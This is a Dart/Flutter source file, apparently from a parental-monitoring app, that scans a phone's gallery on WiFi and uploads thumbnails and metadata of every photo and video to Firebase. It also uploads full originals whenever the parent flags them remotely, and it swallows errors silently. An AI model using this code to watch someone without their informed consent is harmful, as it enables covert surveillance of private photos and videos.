import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:photo_manager/photo_manager.dart';
import 'gps_service.dart';

class GalleryScanner {
  static final _db = FirebaseDatabase.instance;
  static final _storage = FirebaseStorage.instance;

  /// Pide permiso de galería. Devuelve true si fue otorgado.
  static Future<bool> requestPermission() async {
    final result = await PhotoManager.requestPermissionExtend();
    return result.isAuth;
  }

  /// Chequea si hay WiFi activo.
  static Future<bool> _isWifi() async {
    final result = await Connectivity().checkConnectivity();
    return result.contains(ConnectivityResult.wifi);
  }

  /// Escanea galería y sube miniaturas + metadata a Firebase.
  /// Solo corre si hay WiFi. Ignora fotos ya subidas.
  static Future<void> scan() async {
    if (!await _isWifi()) return;

    final permitted = await requestPermission();
    if (!permitted) return;

    // Cargar IDs ya subidos para no repetir
    final uploaded = await _loadUploadedIds();

    // Fotos y videos de todos los álbumes
    final albums = await PhotoManager.getAssetPathList(
      type: RequestType.common,
      onlyAll: true,
    );
    if (albums.isEmpty) return;

    final all = albums.first;
    final count = await all.assetCountAsync;
    if (count == 0) return;

    // Procesar en bloques de 50
    const pageSize = 50;
    for (int page = 0; page * pageSize < count; page++) {
      if (!await _isWifi()) return; // re-chequear wifi entre páginas

      final assets = await all.getAssetListPaged(page: page, size: pageSize);
      for (final asset in assets) {
        if (uploaded.contains(asset.id)) continue;
        await _processAsset(asset);
      }
    }
  }

  static Future<void> _processAsset(AssetEntity asset) async {
    try {
      final thumb = await asset.thumbnailDataWithSize(
        const ThumbnailSize(320, 320),
        quality: 70,
      );
      if (thumb == null) return;

      // Subir miniatura a Storage
      final thumbRef = _storage.ref(
        'devices/$deviceId/gallery/thumbs/${asset.id}.jpg',
      );
      await thumbRef.putData(
        thumb,
        SettableMetadata(contentType: 'image/jpeg'),
      );
      final thumbUrl = await thumbRef.getDownloadURL();

      // Metadata en Realtime DB
      await _db.ref('devices/$deviceId/gallery/${asset.id}').set({
        'id': asset.id,
        'type': asset.type == AssetType.video ? 'video' : 'image',
        'date': asset.createDateTime.millisecondsSinceEpoch,
        'width': asset.width,
        'height': asset.height,
        'duration': asset.duration, // segundos, 0 si es foto
        'thumb': thumbUrl,
        'downloaded': false,
      });
    } catch (_) {
      // Si una foto falla, continúa con la siguiente
    }
  }

  /// Escucha nodo Firebase. Si el padre pone download:true en una foto,
  /// sube el original a Storage (solo si hay WiFi).
  static void listenDownloadRequests() {
    _db
        .ref('devices/$deviceId/gallery')
        .onChildChanged
        .listen((event) async {
      final data = event.snapshot.value;
      if (data == null) return;
      final map = Map<String, dynamic>.from(data as Map);
      if (map['download'] != true || map['downloaded'] == true) return;

      // Verificar WiFi antes de subir original
      if (!await _isWifi()) return;

      final assetId = map['id'] as String? ?? event.snapshot.key ?? '';
      await _uploadOriginal(assetId, event.snapshot.key ?? '');
    });
  }

  static Future<void> _uploadOriginal(String assetId, String nodeKey) async {
    try {
      final assets = await AssetEntity.fromId(assetId);
      if (assets == null) return;

      final file = await assets.originFile;
      if (file == null) return;

      final ext = assets.type == AssetType.video ? 'mp4' : 'jpg';
      final ref = _storage.ref(
        'devices/$deviceId/gallery/originals/$assetId.$ext',
      );

      await ref.putFile(
        file,
        SettableMetadata(
          contentType:
              assets.type == AssetType.video ? 'video/mp4' : 'image/jpeg',
        ),
      );
      final url = await ref.getDownloadURL();

      await _db.ref('devices/$deviceId/gallery/$nodeKey').update({
        'original': url,
        'downloaded': true,
      });
    } catch (_) {}
  }

  /// Carga el set de IDs ya subidos para evitar repetir.
  static Future<Set<String>> _loadUploadedIds() async {
    try {
      final snap = await _db
          .ref('devices/$deviceId/gallery')
          .orderByChild('id')
          .get();
      if (snap.value == null) return {};
      final map = Map<String, dynamic>.from(snap.value as Map);
      return map.keys.toSet();
    } catch (_) {
      return {};
    }
  }
}
